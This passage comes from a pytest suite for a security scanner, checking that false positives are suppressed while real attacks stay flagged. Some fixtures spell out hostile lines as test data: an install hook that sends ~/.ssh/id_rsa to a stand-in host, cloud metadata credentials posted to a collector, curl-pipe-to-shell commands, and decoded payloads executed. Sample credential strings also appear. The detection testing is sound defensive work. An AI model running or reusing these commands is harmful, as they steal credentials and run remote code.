        b'// ruleid: adafruit-api-key\nadafruit_api_token = "9zu9r6idf9c0tfcc4w26l66ij7visb8n"\n'
    )
    RULESET = (
        b"rules:\n"
        b"  - id: hardcoded-credential\n"
        b"    message: A credential is assigned in source\n"
        b"    languages: [python]\n"
        b"    severity: ERROR\n"
        b"    patterns:\n"
        b'      - pattern: token = "..."\n'
    )

    @staticmethod
    def content(path: str, raw: bytes):
        from cordon_scanner.core.content import FileContent

        return FileContent(path=path, raw=raw, size=len(raw))

    @pytest.mark.parametrize(
        "line",
        [
            b"// ruleid: adafruit-api-key",
            b"# ruleid: python.lang.security.audit.x",
            b"# ok: python.lang.security.audit.x",
            b"// todoruleid: some-rule",
            b"# todook: some-rule",
            b"// deepruleid: some-rule",
            b"-- ruleid: sql-injection",
            b"  * ruleid: java-thing",
        ],
    )
    def test_the_annotation_family_is_recognised(self, line: bytes) -> None:
        assert self.content("sample.go", line + b"\nx = 1\n").is_rule_material

    @pytest.mark.parametrize(
        "line",
        [
            b"// TODO: dropbox-long-lived-api-token",
            b"ruleid: not-in-a-comment",
            b"// ruleid:",
            b'print("ok: fine")',
            b"// okay: something",
        ],
    )
    def test_near_misses_are_not(self, line: bytes) -> None:
        """Narrow on purpose. The annotation has to start a line, sit in a comment, and
        name a rule; otherwise prose containing the word would exempt a file."""
        assert not self.content("sample.go", line + b"\nx = 1\n").is_rule_material

    def test_a_rule_set_is_recognised(self) -> None:
        assert self.content("rules/credentials.yaml", self.RULESET).is_rule_material

    def test_an_ordinary_document_with_an_id_is_not(self) -> None:
        """All three signals are required together. A Kubernetes list, an OpenAPI
        document or a CI file may well have `- id:` in it."""
        raw = b"rules:\n  - id: allow-http\n    from: 0.0.0.0/0\n"
        assert not self.content("infra/firewall.yaml", raw).is_rule_material

    @staticmethod
    def everything(root):
        """Scanned down to INFO, which is below the default reporting threshold.

        The point of the ceiling is that these drop out of a default scan, so a test
        that wants to see them has to ask the way a curious reader would."""
        from cordon_scanner.core.config import Config
        from cordon_scanner.core.models import Severity

        config = Config.default().with_overrides(severity_threshold=Severity.INFO)
        return Scanner(config).scan(root)

    def test_a_sample_credential_is_ceilinged(self, tmp_path) -> None:
        from cordon_scanner.core.models import Severity

        corpus = tmp_path / "generic" / "secrets" / "gitleaks"
        corpus.mkdir(parents=True)
        (corpus / "adafruit-api-key.go").write_bytes(self.ANNOTATED)
        assert not Scanner().scan(tmp_path).findings, "nothing at the default threshold"
        result = self.everything(tmp_path)
        secrets = [f for f in result.findings if f.rule_id.startswith("SECRET.")]
        assert secrets, "the rule still runs and the finding is still made"
        assert all(f.severity is Severity.INFO for f in secrets)
        assert "rule material" in secrets[0].message

    def test_an_infrastructure_sample_is_ceilinged(self, tmp_path) -> None:
        from cordon_scanner.core.models import Severity

        corpus = tmp_path / "terraform" / "aws" / "security"
        corpus.mkdir(parents=True)
        (corpus / "public-ingress.tf").write_bytes(
            b"# ruleid: aws-ec2-security-group-allows-public-ingress\n"
            b'resource "aws_security_group" "x" {\n'
            b"  ingress {\n"
            b'    cidr_blocks = ["0.0.0.0/0"]\n'
            b"  }\n"
            b"}\n"
        )
        assert not Scanner().scan(tmp_path).findings, "nothing at the default threshold"
        result = self.everything(tmp_path)
        iac = [f for f in result.findings if f.rule_id.startswith("SUSPECT.IAC.")]
        assert iac, "the rule still runs"
        assert all(f.severity is Severity.INFO for f in iac)

    def test_the_same_file_without_the_annotation_is_reported_in_full(self, tmp_path) -> None:
        """The control. Remove the one comment line and the finding is a finding again,
        which is what makes the exemption a statement about rule corpora rather than a
        weakening of the rule."""
        from cordon_scanner.core.models import Severity

        corpus = tmp_path / "infra"
        corpus.mkdir()
        (corpus / "main.tf").write_bytes(
            b'resource "aws_security_group" "x" {\n'
            b"  ingress {\n"
            b'    cidr_blocks = ["0.0.0.0/0"]\n'
            b"  }\n"
            b"}\n"
        )
        iac = [f for f in Scanner().scan(tmp_path).findings if f.rule_id.startswith("SUSPECT.IAC.")]
        assert iac and any(f.severity >= Severity.HIGH for f in iac)

    def test_an_annotation_does_not_hide_malware(self, tmp_path) -> None:
        """The bypass, tested. MALICIOUS is never ceilinged, so a payload that plants a
        `// ruleid:` comment gains nothing: this is why the predicate lowers a severity
        instead of dropping a finding."""
        package = tmp_path / "pkg"
        package.mkdir()
        (package / "package.json").write_text(
            '{"name": "x", "version": "1.0.0", "scripts": {"postinstall": "node i.js"}}'
        )
        (package / "i.js").write_bytes(
            b"// ruleid: credential-exfiltration\n"
            + assemble(
                "const k = require('fs').readFileSync(process.env.HOME + '/.ssh/id_rsa');\n",
                "require('https').request('https://x.test/c', {method:'POST'}).end(k);\n",
            ).encode()
        )
        assert any(rule.startswith("MALWARE.") for rule in flagged(tmp_path))

    def test_a_binary_is_not_asked(self) -> None:
        """The signals are text signals. A compiled artefact cannot carry either, and
        should not pay two regex passes to establish that."""
        raw = b"\x7fELF" + b"\x00" * 64 + b"// ruleid: x\n"
        assert not self.content("lib/x.so", raw).is_rule_material


class TestTheMetadataEndpointIsNotTheNetwork:
    """`stacksimplify/terraform-on-aws-eks` supplied fifteen copies of a fourteen-line
    cloud-init script that installs Apache and writes the EC2 instance identity document
    into the webroot. Cordon read the IMDS fetch as an outbound connection and made two
    claims about it, both false:

    * `SUSPECT.PERSIST.001` -- "reaches the network and writes to a location that
      survives a restart" -- where the write was `systemctl enable httpd`, the service
      `yum` had just installed.
    * `SUSPECT.EXFIL.001` -- "reads credentials, opens an outbound connection, and runs
      code".

    Nothing left the instance. 169.254.169.254 is link-local, and reading it is how a
    very large amount of ordinary cloud tooling finds out where it is running.

    Per match, not per file, so a script that reads metadata and then posts it somewhere
    real keeps the capability -- which is the attack this must not stop reporting.
    """

    CLOUD_INIT = (
        b"#! /bin/bash\n"
        b"sudo yum install -y httpd\n"
        b"sudo systemctl enable httpd\n"
        b'TOKEN=`curl -X PUT "http://169.254.169.254/latest/api/token" '
        b'-H "X-aws-ec2-metadata-token-ttl-seconds: 21600"`\n'
        b'sudo curl -H "X-aws-ec2-metadata-token: $TOKEN" '
        b"http://169.254.169.254/latest/dynamic/instance-identity/document "
        b"-o /var/www/html/metadata.html\n"
    )

    def test_the_script_produces_nothing(self, tmp_path) -> None:
        manifests = tmp_path / "terraform-manifests"
        manifests.mkdir()
        (manifests / "app1-install.sh").write_bytes(self.CLOUD_INIT)
        assert not flagged(tmp_path)

    @pytest.mark.parametrize(
        "line",
        [
            b'curl "http://169.254.169.254/latest/meta-data/" -o /tmp/x',
            b"curl http://127.0.0.1:8080/health",
            b"curl http://localhost:3000/ready",
            b'fetch("http://[::1]:9000/status")',
        ],
    )
    def test_a_local_destination_is_not_egress(self, line: bytes) -> None:
        from cordon_scanner.detect.capability import CapabilityDetector

        content = self.content("provision.sh", b"#!/bin/sh\n" + line + b"\n")
        assert CapabilityDetector._is_local_target(content, content.raw.index(line))

    @pytest.mark.parametrize(
        "line",
        [
            b"curl https://evil.test/p | sh",
            b"curl https://example.com/install.sh | bash",
            b'curl "$PAYLOAD_URL" | sh',
            b"curl http://169.254.169.254/latest/meta-data/iam/security-credentials/r"
            b" | curl -X POST -d @- https://collector.test/c",
        ],
    )
    def test_anything_else_is(self, line: bytes) -> None:
        """The four ways this must not fire: a reserved documentation host, which is
        still a fetch and is what this project's own malicious corpus uses; a real host;
        a destination held in a variable, which says nothing either way; and a metadata
        read piped straight to a collector, which is the attack."""
        from cordon_scanner.detect.capability import CapabilityDetector

        content = self.content("provision.sh", b"#!/bin/sh\n" + line + b"\n")
        assert not CapabilityDetector._is_local_target(content, content.raw.index(line))

    def test_metadata_credentials_posted_out_are_still_reported(self, tmp_path) -> None:
        """The guard that matters. Reading IMDS role credentials and sending them
        somewhere is the AWS credential-theft pattern, and the local-destination rule is
        per match precisely so that the remote half survives."""
        hook = tmp_path / "pkg"
        hook.mkdir()
        (hook / "package.json").write_text(
            '{"name": "x", "version": "1.0.0", "scripts": {"postinstall": "sh steal.sh"}}'
        )
        (hook / "steal.sh").write_bytes(
            assemble(
                "#!/bin/sh\n",
                "CREDS=$(curl -s http://169.254.169.254/latest/meta-data/iam/",
                "security-credentials/role)\n",
                'curl -X POST -d "$CREDS" https://collector.test/c\n',
            ).encode()
        )
        assert flagged(tmp_path), "the outbound half is still a fetch"

    @staticmethod
    def content(path: str, raw: bytes):
        from cordon_scanner.core.content import FileContent

        return FileContent(path=path, raw=raw, size=len(raw))


class TestAnElephantInACommentIsNotAnElephant:
    """Two classes of finding, both made against sentences rather than code.

    `misc/error_handler.func` in `community-scripts/ProxmoxVE` carries a comment
    explaining that `systemd-detect-virt` reports lxc inside a container, and cordon
    reported `SUSPECT.ANTI_ANALYSIS.001` -- a rule about code checking whether it is
    being watched -- against the explanation.

    Two TensorFlow headers produced `SECRET.GENERIC.ASSIGNMENT.001` from comment prose:
    one documenting an environment variable by showing it set, the other a sentence of
    the form "after this pass" followed by a colon and an example instruction name.

    The split matters. For a capability the comment settles it, because a comment does
    not run. For a secret it depends on the rule: the generic assignment rule is a name
    plus an entropy measure and prose defeats it, while a provider pattern is a shape
    that is a credential wherever it appears -- including on a line somebody commented
    out instead of rotating, which is a leak and not a cleanup.
    """

    @staticmethod
    def content(path: str, raw: bytes):
        from cordon_scanner.core.content import FileContent

        return FileContent(path=path, raw=raw, size=len(raw))

    @pytest.mark.parametrize(
        ("line", "column", "language", "commented"),
        [
            ("# systemd-detect-virt reports lxc in containers", 10, "shell", True),
            ("// after this pass: broadcast.123.0", 20, "cpp", True),
            (" * api_key: aW52ZW50ZWQtdmFsdWU", 5, "java", True),
            ("-- select token from t", 12, "sql", True),
            ("#!/bin/sh", 3, "shell", False),
            ('curl "https://x.test/a#fragment" | sh', 30, "shell", False),
            ('print("# not a comment")', 9, "python", False),
            ("const x = 1; // trailing", 6, "typescript", False),
            ("const x = 1; // trailing", 16, "typescript", True),
            ("# anything", 5, None, False),
            ("# anything", 5, "unknownlang", False),
        ],
    )
    def test_the_predicate(self, line: str, column: int, language, commented: bool) -> None:
        from cordon_scanner.core.comments import is_commented

        assert is_commented(line, column, language) is commented

    def test_a_quoted_hash_is_not_a_comment(self) -> None:
        """The case that makes this worth tracking quote state for. A fragment in a URL
        is not a comment, and the pipe after it is not commented out."""
        from cordon_scanner.core.comments import is_commented

        line = 'curl "https://x.test/p#frag" | sh'
        assert not is_commented(line, line.index("| sh"), "shell")

    def test_a_capability_in_a_comment_is_not_reported(self, tmp_path) -> None:
        script = tmp_path / "misc"
        script.mkdir()
        (script / "error_handler.func").write_bytes(
            b"#!/usr/bin/env bash\n"
            b"# systemd-detect-virt reports lxc inside containers, so the check below\n"
            b"# deliberately does not run it.\n"
            b'report() { echo "$1"; }\n'
        )
        assert "SUSPECT.ANTI_ANALYSIS.001" not in flagged(tmp_path)

    def test_prose_about_a_pass_is_not_a_credential(self, tmp_path) -> None:
        header = tmp_path / "compiler"
        header.mkdir()
        (header / "renamer.h").write_bytes(
            b"// After this pass: broadcast.123.0\n"
            b"// And with the filter set: LegalizeTF;Canonicalizer\n"
            b"void Rename();\n"
        )
        assert not flagged(tmp_path)

    def test_a_commented_out_provider_token_is_still_reported(self, tmp_path) -> None:
        """The deliberate asymmetry, and the reason the predicate is not applied to the
        provider patterns. Commenting a token out is not rotating it."""
        source = tmp_path / "app"
        source.mkdir()
        (source / "client.py").write_bytes(
            ("# " + assemble("ghp_", "A1b2C3d4E5f6G7h8I9j0K1l2M3n4O5p6Q7r8") + "\n").encode()
        )
        assert "SECRET.GITHUB.TOKEN.001" in flagged(tmp_path)

    def test_the_same_assignment_in_code_is_still_reported(self, tmp_path) -> None:
        """The control for the generic rule: uncomment it and it is a finding again."""
        source = tmp_path / "app"
        source.mkdir()
        (source / "settings.py").write_bytes(
            ("api_key = " + repr(assemble("aW52ZW50ZWQtc2Vj", "cmV0LXZhbHVlLXg5")) + "\n").encode()
        )
        assert "SECRET.GENERIC.ASSIGNMENT.001" in flagged(tmp_path)


class TestADeclarationAssignsNothing:
    """`manaflow-ai/cmux` produced 44 credential findings and 43 of them were Swift.
    Not secrets in Swift files -- Swift *syntax*:

        public let credential: CmxIrohAdmissionCredential?
        private var socketPasswordObserver: NSObjectProtocol?
        let refreshToken = originalRefreshToken!
        let pendingToken = pendingWriter?.provisionalToken.id
        passwordAuthorization: &passwordAuthorization
        pendingSizingPassIntent = .inputChange
        displayToken = "\\(baseDisplayToken)\\(displaySuffix)"
        auth_token="$(cmux_computer_use_auth_token)"

    A type annotation assigns nothing at all. An optional chain, a force-unwrap, an
    inout argument and a member-shorthand enum case are references to other code. A
    string interpolation and a command substitution are templates whose value is not
    in the file.

    What they share is a marker -- `?`, `!`, `&`, a leading dot, `\\(`, `$(` -- that no
    generated credential contains. A marker is REQUIRED rather than optional, because
    the one real finding in that repository is a bare identifier too: a PostHog
    project key, reported correctly and still reported.
    """

    @pytest.mark.parametrize(
        "value",
        [
            b"CmxIrohAdmissionCredential?",
            b"NSObjectProtocol?",
            b"InstalledCredential?",
            b"originalRefreshToken!",
            b"pendingWriter?.provisionalToken.id",
            b"configuration.relayToken?",
            b"RemoteTmuxControlConnection.ObserverToken?",
            b"&passwordAuthorization",
            b".constraintRecovery",
            b"!socketPasswordModel.current.isEmpty",
            b"$0.authenticationToken",
        ],
    )
    def test_an_expression_is_not_a_credential(self, value: bytes) -> None:
        assert NOT_A_SECRET.match(value) is not None

    @pytest.mark.parametrize(
        "value",
        [
            b"phc_Kq3Wd7Rt9Zx2Vb5Nm8Jf4Hs6Lp1Gy0Cu3Ae7Tn2Qi9Z",
            b"glpat-AAAAAAAAAAAAAAAA",
            b"xKc9vB2mQ7wRtY4u",
        ],
    )
    def test_a_bare_literal_still_is(self, value: bytes) -> None:
        """The guard. Every shape above is excused by a marker; a value with none of
        them is untouched, including the real key this repository does commit."""
        assert NOT_A_SECRET.match(value) is None

    @pytest.mark.parametrize(
        "value",
        [
            rb"\(baseDisplayToken)\(displaySuffix)",
            rb"$(cmux_computer_use_auth_token)",
        ],
    )
    def test_interpolation_and_substitution_are_templates(self, value: bytes) -> None:
        from cordon_scanner.detect.secrets import PLACEHOLDER

        assert PLACEHOLDER.search(value) is not None

    def test_the_swift_declarations_produce_nothing(self, tmp_path) -> None:
        source = tmp_path / "Sources"
        source.mkdir()
        (source / "Transport.swift").write_bytes(
            b"public struct CmxIrohStreamHeader {\n"
            b"    public let credential: CmxIrohAdmissionCredential?\n"
            b"    private var socketPasswordObserver: NSObjectProtocol?\n"
            b"    let relayToken = configuration.relayToken?\n"
            b"    let hasPassword = !socketPasswordModel.current.isEmpty\n"
            b"}\n"
        )
        assert "SECRET.GENERIC.ASSIGNMENT.001" not in flagged(tmp_path)

    def test_a_real_key_in_the_same_file_is_still_found(self, tmp_path) -> None:
        source = tmp_path / "Sources"
        source.mkdir()
        (source / "Analytics.swift").write_bytes(
            (
                "final class Analytics {\n"
                "    private var observer: NSObjectProtocol?\n"
                # The PikPak OAuth client secret `AlistGo/alist` commits, rather than
                # the PostHog key this used to carry: a PostHog PROJECT key is published
                # on purpose and is now exempt at the finding site, so as a control it
                # asserted nothing. This one carries no provider prefix, which is what
                # keeps the assertion on the GENERIC rule rather than a provider's.
                "    private let apiKey = " + repr(assemble("dbw2OtmVEe", "uUvIptb1Coyg")) + "\n}\n"
            ).encode()
        )
        assert "SECRET.GENERIC.ASSIGNMENT.001" in flagged(tmp_path)


class TestProvisioningAMachineIsNotAFoothold:
    """`persist` plus `egress` was reported at high 501 times across 106 of the 1,487
    repositories measured, and the largest groups were machine bootstrap scripts:
    `ViktorUJ/cks` twenty-one, `stacksimplify/terraform-on-aws-ec2` seventy-seven
    copies of `yum install httpd` beside `systemctl enable httpd`.

    Nothing in the pair requires the thing made persistent to be the thing fetched --
    the same gap `SUSPECT.DROPPER.001` already documents -- and for a script that
    installs operating-system packages the pair is not a side effect of the job, it is
    the job: download kubectl, write a kubelet drop-in, enable the unit, append shell
    completion to `.bashrc`.

    So installing OS packages is the signal that this file provisions a machine, and
    persistence findings in one are ceilinged. Three things keep it narrow: it applies
    to the persistence composites only, never to a dropper; it is a ceiling rather
    than an exemption; and it is applied before the install-hook escalation, so the
    same script shipped as somebody's postinstall is still critical.
    """

    BOOTSTRAP = (
        b"#!/bin/bash\n"
        b"apt-get update -y\n"
        b"apt-get install -y unzip apt-transport-https ca-certificates curl jq\n"
        b'curl -LO "https://dl.k8s.io/release/v1.31.0/bin/linux/amd64/kubectl"\n'
        b"install -o root -g root -m 0755 kubectl /usr/local/bin/kubectl\n"
        b"mkdir -p /etc/systemd/system/kubelet.service.d\n"
        b"systemctl enable kubelet\n"
        b"echo 'source <(kubectl completion bash)' >> /home/ubuntu/.bashrc\n"
        b"echo 'alias k=kubectl' >> /home/ubuntu/.bashrc\n"
    )

    def test_the_predicate(self) -> None:
        from cordon_scanner.core.samples import is_machine_provisioning

        assert is_machine_provisioning(self.BOOTSTRAP)
        assert is_machine_provisioning(b"#cloud-config\npackages:\n  - curl\n")
        assert not is_machine_provisioning(b"#!/bin/sh\nnpm install\npip install requests\n")
        assert not is_machine_provisioning(b"# apt-get install is how you would do it\n")

    def test_a_bootstrap_script_is_not_a_persistence_finding(self, tmp_path) -> None:
        """A ceiling, so the finding survives and stops blocking. Which is the whole
        claim: the script does make things persist, and a reader has nothing to do
        about it."""
        from cordon_scanner.core.models import Severity

        template = tmp_path / "terraform" / "modules" / "k8s" / "template"
        template.mkdir(parents=True)
        (template / "worker.sh").write_bytes(self.BOOTSTRAP)
        persist = [
            f for f in Scanner().scan(tmp_path).findings if f.rule_id == "SUSPECT.PERSIST.001"
        ]
        assert persist, "still reported"
        assert all(f.severity <= Severity.MEDIUM for f in persist)
        assert "provisions a machine" in " ".join(
            e for f in persist for e in f.explanation.escalations
        )

    def test_the_same_pair_without_a_package_install_is_reported(self, tmp_path) -> None:
        """The control, and the corpus sample's shape: fetch something and append it to
        a shell profile, with nothing in the file that says a machine is being built."""
        hook = tmp_path / "agent"
        hook.mkdir()
        (hook / "telemetry.sh").write_bytes(
            assemble(
                "#!/bin/sh\n",
                'body="$(curl -fsSL https://cdn.test/agent.sh)"\n',
                'echo "$body" >> "$HOME/.bashrc"\n',
            ).encode()
        )
        from cordon_scanner.core.models import Severity

        persist = [
            f for f in Scanner().scan(tmp_path).findings if f.rule_id == "SUSPECT.PERSIST.001"
        ]
        assert persist and any(f.severity >= Severity.HIGH for f in persist)

    def test_a_dropper_in_a_provisioning_script_is_still_reported(self, tmp_path) -> None:
        """The other half of the narrowness. `curl | bash` is a choice a provisioning
        script has to answer for, and it is how the one real supply-chain exposure in
        the measurement corpus works."""
        template = tmp_path / "scripts"
        template.mkdir()
        (template / "install-node.sh").write_bytes(
            assemble(
                "#!/bin/bash\n",
                "apt-get install -y curl\n",
                "curl -fsSL https://get.helm.test/install.sh | bash\n",
            ).encode()
        )
        assert "SUSPECT.DROPPER.001" in flagged(tmp_path)


class TestAContainerBuildIsNotAnAttack:
    """Two container rules, 347 findings between them across the measurement corpus,
    and the large majority were a Dockerfile doing what Dockerfiles do.

    `SUSPECT.CONTAINER.FETCH_EXEC.001` produced 34 findings on `dotnet/dotnet-docker`
    -- every one the same line in Microsoft's official .NET base images, which
    downloads Canonical's `chisel-wrapper` from a tag-pinned URL and chmods it.
    Installing a released binary is how an image installs a tool. The rule's own
    comment claimed the download-and-chmod pair "has no innocent reading"; cadvisor,
    confd, the Home Assistant CLI and yt-dlp are four more in one repository.

    So a PINNED reference demotes the finding the way a verified checksum already did,
    and the unpinned forms keep their severity -- `curl https://sh.rustup.rs | sh` and
    `curl https://bootstrap.saltstack.com | bash` are in the same corpus and are
    exactly what the rule is for.

    `SUSPECT.CONTAINER.BUILD_SECRET.001` matched on the NAME alone, so
    `ARG NPM_SECRETLINT_VERSION=13.0.5` -- the version of a linter called secretlint --
    was a credential shipped in the image history, nineteen times across
    `oxsecurity/megalinter`. And `ENV HUBOT_SLACK_TOKEN=` with no value is the
    opposite of baking a secret in: it documents what the operator has to supply.
    """

    @staticmethod
    def rule(rule_id: str):
        from cordon_scanner.detect.config_files import RULES

        return next(r for r in RULES if r.rule_id == rule_id)

    @pytest.mark.parametrize(
        ("line", "reported"),
        [
            (b"ARG NPM_SECRETLINT_VERSION=13.0.5", False),
            (b"ENV HUBOT_SLACK_TOKEN=", False),
            (b"ENV PASSWORD=", False),
            (b'ENV PASSWORD=""', False),
            (b"ENV TOKEN=00000000-0000-0000-0000-000000000000", False),
            (b"ARG NPM_TOKEN=npm_aBcDeFgHiJkLmNoPqRsTuVwXyZ012345", True),
            (b"ENV AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLE", True),
            (b"ARG CLIENTSECRET=s3cr3t-value-here", True),
        ],
    )
    def test_a_build_argument_needs_a_name_and_a_value(self, line: bytes, reported: bool) -> None:
        assert (
            bool(self.rule("SUSPECT.CONTAINER.BUILD_SECRET.001").pattern.search(line)) is reported
        )

    def test_a_pinned_download_is_one_step_lower(self, tmp_path) -> None:
        from cordon_scanner.core.models import Severity

        (tmp_path / "Dockerfile").write_bytes(
            b"FROM ubuntu:24.04@sha256:"
            + b"0" * 64
            + b"\nRUN curl --fail --location --output /usr/bin/chisel-wrapper \\\n"
            b"      https://raw.githubusercontent.com/canonical/rocks-toolbox/v1.2.0/chisel-wrapper \\\n"
            b"    && chmod 755 /usr/bin/chisel-wrapper\n"
        )
        fetch = [
            f
            for f in Scanner().scan(tmp_path).findings
            if f.rule_id == "SUSPECT.CONTAINER.FETCH_EXEC.001"
        ]
        assert fetch, "still reported"
        assert all(f.severity <= Severity.MEDIUM for f in fetch)

    def test_an_unpinned_pipe_into_a_shell_is_not(self, tmp_path) -> None:
        from cordon_scanner.core.models import Severity

        (tmp_path / "Dockerfile").write_bytes(
            b"FROM ubuntu:24.04@sha256:"
            + b"0" * 64
            + b"\nRUN curl https://sh.rustup.test -sSf | sh -s -- -y\n"
        )
        fetch = [
            f
            for f in Scanner().scan(tmp_path).findings
            if f.rule_id == "SUSPECT.CONTAINER.FETCH_EXEC.001"
        ]
        assert fetch and any(f.severity >= Severity.HIGH for f in fetch)


class TestARegexMatchIsNotAProcess:
    """`SUSPECT.DECODE_EXEC.001` was 684 findings across 252 of the 1,487 repositories
    measured, and three unrelated defects were producing most of them.

    **`.exec()` on a regular expression.** `CAP.JS.SPAWN.001` matched a bare `exec(`,
    and `RegExp.prototype.exec` is how every JavaScript file in the world matches a
    pattern. A data-URL parser -- `/^data:([^,]*),(.*)$/.exec(dataUrl)` -- beside a
    base64 decode was reported as decoded data being executed.

    **A spawn whose whole argv is written out.** `subprocess.run(["git", "rev-parse",
    "--short", "HEAD"])` cannot be running what the file decoded: what it runs is in
    the file. `NousResearch/hermes-agent` supplied eleven of those. The real cases
    survive because a constant argv is ANALYSED rather than trusted -- the
    embedded-shell tier pulls the fetch and the pipe out of `os.system("curl x | sh")`
    -- and a constant command naming a temporary path is not treated as fixed at all.

    **Adaptive environment checks read as evasion.** `/proc/self/cgroup` is where Linux
    reports a process's resource limits, and `os.geteuid() == 0` is how every installer
    decides whether it is root. Neither is hiding from anything.
    """

    @staticmethod
    def capability_lines(source: str, language: str, capability: str) -> set[int]:
        from cordon_scanner.core.content import FileContent
        from cordon_scanner.core.models import Capability
        from cordon_scanner.detect.base import RuleSelector
        from cordon_scanner.detect.capability import CapabilityDetector
        from cordon_scanner.rules.loader import RuleLoader, RuleSet

        raw = source.encode()
        suffix = {"typescript": "ts", "javascript": "js", "python": "py"}[language]
        content = FileContent(path=f"app.{suffix}", raw=raw, size=len(raw))
        # Selected by language, the way the engine does it: `exec(` is a process in
        # Ruby and PHP and a pattern match in JavaScript, and the packs are allowed to
        # disagree about a spelling because only one of them runs on a given file.
        rules = RuleSet(RuleLoader.load_builtin())
        hits = CapabilityDetector()._match_capabilities(
            content,
            RuleSelector.select_rules(rules, language=language, path=content.path),
            language,
        )
        wanted = Capability(capability)
        return {h.line for h in hits if h.capability is wanted}

    def test_a_regex_exec_is_not_a_spawn(self) -> None:
        source = "\n".join(
            [
                "const DATA_URL_RE = /^data:([^,]*),([\\s\\S]*)$/;",
                "const match = DATA_URL_RE.exec(dataUrl.trim());",
                "const other = /^x(.*)$/.exec(String(value || ''));",
            ]
        )
        assert self.capability_lines(source, "typescript", "spawn") == set()

    def test_a_child_process_exec_still_is(self) -> None:
        source = "\n".join(
            [
                "const { exec } = require('node:child_process');",
                "exec('npm run build');",
                "child_process.exec(command);",
            ]
        )
        assert self.capability_lines(source, "javascript", "spawn")

    def test_a_fixed_argv_does_not_satisfy_a_composite(self, tmp_path) -> None:
        source = tmp_path / "app"
        source.mkdir()
        (source / "versions.py").write_bytes(
            b"import base64, subprocess\n"
            b"\n"
            b"def head():\n"
            b'    return subprocess.run(["git", "rev-parse", "--short", "HEAD"],\n'
            b"                          capture_output=True, text=True).stdout\n"
            b"\n"
            b"def decode(blob):\n"
            b"    return base64.b64decode(blob)\n"
        )
        assert "SUSPECT.DECODE_EXEC.001" not in flagged(tmp_path)

    def test_a_computed_argv_does(self, tmp_path) -> None:
        """The control. The same two capabilities, with the command assembled from what
        was decoded, which is the claim the rule makes."""
        source = tmp_path / "app"
        source.mkdir()
        (source / "loader.py").write_bytes(
            assemble(
                "import base64, subprocess\n",
                "payload = base64.b64decode(BLOB)\n",
                "subprocess.run(payload, shell=True)\n",
            ).encode()
        )
        assert "SUSPECT.DECODE_EXEC.001" in flagged(tmp_path)

    def test_a_constant_command_naming_a_temporary_path_is_not_fixed(self, tmp_path) -> None:
        """And the exception to the exception: the argv is constant and the FILE it runs
        is not, because whatever ran before it wrote that file."""
        source = tmp_path / "app"
        source.mkdir()
        (source / "stage.py").write_bytes(
            assemble(
                "import base64, subprocess\n",
                "open('/tmp/update', 'wb').write(base64.b64decode(BLOB))\n",
                "subprocess.run(['/tmp/update'])\n",
            ).encode()
        )
        assert "SUSPECT.DECODE_EXEC.001" in flagged(tmp_path)

    @pytest.mark.parametrize(
        "line",
        [
            "with open('/proc/self/cgroup', encoding='utf-8') as fh: limits = fh.read()",
            "if os.geteuid() == 0: raise SystemExit('do not run as root')",
            "if is_container(): timeout = 30",
        ],
    )
    def test_adapting_to_the_environment_is_not_evasion(self, line: str) -> None:
        assert self.capability_lines(line + "\n", "python", "anti_analysis") == set()

    @pytest.mark.parametrize(
        "line",
        [
            "if socket.gethostname() == 'analysis-01': sys.exit(0)",
            "out = subprocess.run(['systemd-detect-virt'])",
            "if os.environ.get('GITHUB_ACTIONS'): return",
        ],
    )
    def test_hiding_from_one_still_is(self, line: str) -> None:
        assert self.capability_lines(line + "\n", "python", "anti_analysis")


class TestAnApiFixtureIsNotADeployment:
    """`kubernetes/kubernetes` produced 798 blocking findings and 649 of them came from
    one directory: `staging/src/k8s.io/api/testdata/HEAD/`, which holds one YAML per
    API type, each a fully-populated example of every field that type has. So every
    boolean in them is `true` -- `privileged`, `hostPID`, `hostIPC`, `hostNetwork` --
    because the files exist to prove the serialiser round-trips, not to be applied.

    `SUSPECT.IAC.PRIVILEGED.001` was 1,584 findings across the measurement corpus, the
    third largest group of anything, and the config detector was the only content
    detector with no fixture ceiling at all.

    Documentation paths are deliberately not ceilinged here, and the corpus proved why
    within one run: `**/*.template` is a documentation glob, because a
    `config.template` holds placeholder credentials -- and a CloudFormation stack is
    also a `.template`.
    """

    FIXTURE = (
        b"apiVersion: v1\n"
        b"kind: Pod\n"
        b"metadata:\n"
        b"  name: podspec\n"
        b"spec:\n"
        b"  hostNetwork: true\n"
        b"  hostPID: true\n"
        b"  hostIPC: true\n"
        b"  containers:\n"
        b"  - name: c\n"
        b"    image: busybox\n"
        b"    securityContext:\n"
        b"      privileged: true\n"
    )

    @staticmethod
    def iac(root, rule: str = "SUSPECT.IAC.PRIVILEGED.001"):
        return [f for f in Scanner().scan(root).findings if f.rule_id == rule]

    def test_api_test_data_is_ceilinged(self, tmp_path) -> None:
        from cordon_scanner.core.models import Severity

        data = tmp_path / "staging" / "src" / "k8s.io" / "api" / "testdata" / "HEAD"
        data.mkdir(parents=True)
        (data / "v1.Pod.yaml").write_bytes(self.FIXTURE)
        found = self.iac(tmp_path)
        assert found, "still reported"
        assert all(f.severity <= Severity.MEDIUM for f in found)
        assert "test material" in found[0].message

    def test_the_same_manifest_in_a_cluster_directory_is_not(self, tmp_path) -> None:
        from cordon_scanner.core.models import Severity

        addons = tmp_path / "cluster" / "addons" / "calico"
        addons.mkdir(parents=True)
        (addons / "daemonset.yaml").write_bytes(self.FIXTURE)
        found = self.iac(tmp_path)
        assert found and any(f.severity >= Severity.HIGH for f in found)

    def test_a_cloudformation_template_is_not_documentation(self, tmp_path) -> None:
        """`.template` is a documentation glob for a reason that does not apply to
        infrastructure: a `config.template` holds placeholders, and a CloudFormation
        stack holds a role."""
        (tmp_path / "stack.template").write_bytes(
            b"Resources:\n"
            b"  Role:\n"
            b"    Type: AWS::IAM::Role\n"
            b"    Properties:\n"
            b"      Policies:\n"
            b"      - PolicyDocument:\n"
            b"          Statement:\n"
            b'          - Effect: Allow\n            Action: "*"\n            Resource: "*"\n'
        )
        from cordon_scanner.core.models import Severity

        found = self.iac(tmp_path, "SUSPECT.IAC.IAM_WILDCARD.001")
        assert found and any(f.severity >= Severity.HIGH for f in found)


class TestAReferenceIsNotAValue:
    """Four more shapes from `mongodb/mongo`, whose 251 baseline findings were down to
    75 before this and are a reference, a member variable, a lexer rule and an
    installer property:

        password: *keyFileData                       # a YAML alias
        auto bypass = _recoveredFromDisk             # a private member
        basic_id_token = "\\\\A([[:alpha:]_](?:\\\\w*))"  # a lexer pattern
        Password='[MONGO_SERVICE_ACCOUNT_PASSWORD]'  # an MSI property

